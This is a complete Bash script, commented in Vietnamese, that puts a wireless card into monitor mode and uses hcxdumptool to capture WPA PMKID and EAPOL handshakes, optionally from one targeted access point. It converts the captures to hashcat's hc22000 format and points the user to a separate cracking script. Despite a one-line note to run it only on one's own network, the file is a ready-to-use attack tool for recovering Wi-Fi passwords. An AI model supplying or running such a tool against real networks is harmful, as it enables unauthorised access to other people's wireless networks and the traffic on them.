#!/usr/bin/env bash
# Thu PMKID + EAPOL handshake (clientless, hcxdumptool >= 6.3)
# Chỉ chạy trên mạng bạn sở hữu. Ví dụ:
#   sudo ./pmkid.sh wlan0 5            # 5 phút, quét mọi kênh
#   sudo ./pmkid.sh wlan0 5 6          # 5 phút, chỉ kênh 6
#   sudo ./pmkid.sh wlan0 5 6c         # 6GHz: kênh 6 band c (a=2.4, b=5, c=6)
#   sudo ./pmkid.sh wlan0 5 6 AA:BB:CC:DD:EE:FF   # chỉ AP mục tiêu (khuyến nghị)
set -euo pipefail

if [[ $EUID -ne 0 ]]; then
  echo "[x] chạy bằng sudo" >&2
  exit 1
fi
IFACE="${1:?usage: sudo ./pmkid.sh <iface> [minutes] [channel] [bssid]}"
MINUTES="${2:-5}"
CHANNEL="${3:-}"
BSSID="${4:-}"

if [[ ! "$MINUTES" =~ ^[1-9][0-9]*$ ]]; then
  echo "[x] minutes phải là số nguyên dương: $MINUTES" >&2
  exit 1
fi
if [[ -n "$CHANNEL" && ! "$CHANNEL" =~ ^[0-9]+[a-e]?$ ]]; then
  echo "[x] channel không hợp lệ: $CHANNEL (vd 6, 40b, 6c)" >&2
  exit 1
fi
if [[ -n "$BSSID" && ! "$BSSID" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
  echo "[x] BSSID không hợp lệ: $BSSID" >&2
  exit 1
fi

umask 077

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
OUT_DIR="$ROOT/captures"
mkdir -p "$OUT_DIR"
chmod 700 "$OUT_DIR" 2>/dev/null || true
STAMP="$(date +%Y%m%d-%H%M%S)"
OUT="$OUT_DIR/pmkid-$STAMP.pcapng"

monitor_list() {
  iw dev 2>/dev/null | awk '/Interface/ {i=$2} /type monitor/ {print i}'
}

restore_iface() {
  local base="$1"
  local protected="$2"
  local mon
  if ! iw dev "$base" info >/dev/null 2>&1; then
    return 0
  fi
  for mon in $(monitor_list); do
    if [[ "$mon" == "$base" ]]; then
      continue
    fi
    if grep -qx "$mon" <<< "$protected"; then
      continue
    fi
    ip link set "$mon" down 2>/dev/null || true
    iw dev "$mon" del 2>/dev/null || true
  done
  if iw dev "$base" info 2>/dev/null | grep -q 'type monitor'; then
    ip link set "$base" down 2>/dev/null || true
    iw dev "$base" set type managed 2>/dev/null || true
  fi
  ip link set "$base" up 2>/dev/null || true
}

OLD_MON="$(monitor_list)"
BPF_FILE=""
cleanup() {
  if [[ -n "$BPF_FILE" ]]; then
    rm -f "$BPF_FILE"
  fi
  restore_iface "$IFACE" "$OLD_MON"
}
trap cleanup EXIT

if ! command -v hcxdumptool >/dev/null; then
  echo "[x] thiếu hcxdumptool. Kali: apt install hcxdumptool hcxtools" >&2
  exit 1
fi

rfkill unblock wifi 2>/dev/null || true
# PMKID hoạt động tốt hơn khi không có NetworkManager/wpa_supplicant tranh card.
# Lưu ý: lệnh này ngắt WiFi hiện tại của máy.
if command -v airmon-ng >/dev/null; then
  airmon-ng check kill >/dev/null 2>&1 || true
fi

HCX_VER="$(hcxdumptool -v 2>/dev/null | awk 'NR==1{print $2}')"
HCX_MAJOR="${HCX_VER%%.*}"
HCX_MINOR="${HCX_VER#*.}"
HCX_MINOR="${HCX_MINOR%%.*}"
[[ "$HCX_MAJOR" =~ ^[0-9]+$ ]] || HCX_MAJOR=99
[[ "$HCX_MINOR" =~ ^[0-9]+$ ]] || HCX_MINOR=99

# từ 6.3.0: -o → -w, --enable_status → --rds, -c bắt buộc kèm hậu tố band
HCX_NEW=0
if (( HCX_MAJOR > 6 || (HCX_MAJOR == 6 && HCX_MINOR >= 3) )); then
  HCX_NEW=1
fi

if (( HCX_NEW )); then
  ARGS=(-i "$IFACE" -w "$OUT" --tot="$MINUTES" --rds=1)
else
  ARGS=(-i "$IFACE" -o "$OUT" --tot="$MINUTES" --enable_status=1)
fi

if [[ -n "$CHANNEL" ]]; then
  if (( HCX_NEW )); then
    if [[ "$CHANNEL" =~ ^[0-9]+$ ]]; then
      if (( CHANNEL <= 14 )); then CHANNEL+="a"; else CHANNEL+="b"; fi
    fi
  else
    CHANNEL="${CHANNEL%[a-e]}"
  fi
  ARGS+=(-c "$CHANNEL")
fi

BSSID_HEX="${BSSID//:/}"
BSSID_HEX="${BSSID_HEX,,}"
if [[ -n "$BSSID" ]]; then
  BPF_FILE="$(mktemp /tmp/bruteforcewf-bpf.XXXXXX 2>/dev/null)" || BPF_FILE=""
  if [[ -n "$BPF_FILE" ]] && hcxdumptool --bpfc="wlan addr3 $BSSID_HEX" > "$BPF_FILE" 2>/dev/null && [[ -s "$BPF_FILE" ]]; then
    ARGS+=(--bpf="$BPF_FILE")
    if hcxdumptool -h 2>/dev/null | grep -q -- '--exitoneapol'; then
      # bitmask 1|2|4: PMKID hoặc EAPOL đủ cặp (ý nghĩa bit đổi giữa các bản, nhưng 7 luôn đúng)
      ARGS+=(--exitoneapol=7)
    fi
    echo "[*] chỉ capture AP $BSSID (BPF)"
  else
    if [[ -n "$BPF_FILE" ]]; then rm -f "$BPF_FILE"; fi
    BPF_FILE=""
    echo "[x] không tạo được BPF filter — huỷ để không capture mọi AP" >&2
    exit 1
  fi
fi

echo "[*] capture PMKID + EAPOL ${MINUTES} phút trên $IFACE${CHANNEL:+ (kênh $CHANNEL)}"
echo "    Ctrl+C để dừng sớm — file vẫn được giữ."
hcxdumptool "${ARGS[@]}" || true
restore_iface "$IFACE" "$OLD_MON"

if [[ ! -s "$OUT" ]]; then
  echo "[-] không thu được gì. Kiểm tra: card hỗ trợ monitor mode? đứng gần AP? thử kênh cụ thể."
  exit 1
fi

if command -v hcxpcapngtool >/dev/null; then
  HASH="${OUT%.pcapng}.hc22000"
  echo "[*] convert → $HASH"
  hcxpcapngtool -o "$HASH" "$OUT" | tail -n 30 || true
  if [[ -s "$HASH" ]]; then
    echo "[+] xong. Copy $HASH sang Windows rồi chạy: python crack.py <file.hc22000>"
  else
    echo "[-] không có PMKID/handshake trong dump (AP có thể đã vá PMKID). Dùng handshake.sh với client đang kết nối."
  fi
else
  echo "[!] thiếu hcxpcapngtool (hcxtools). Convert sau: hcxpcapngtool -o out.hc22000 \"$OUT\""
fi
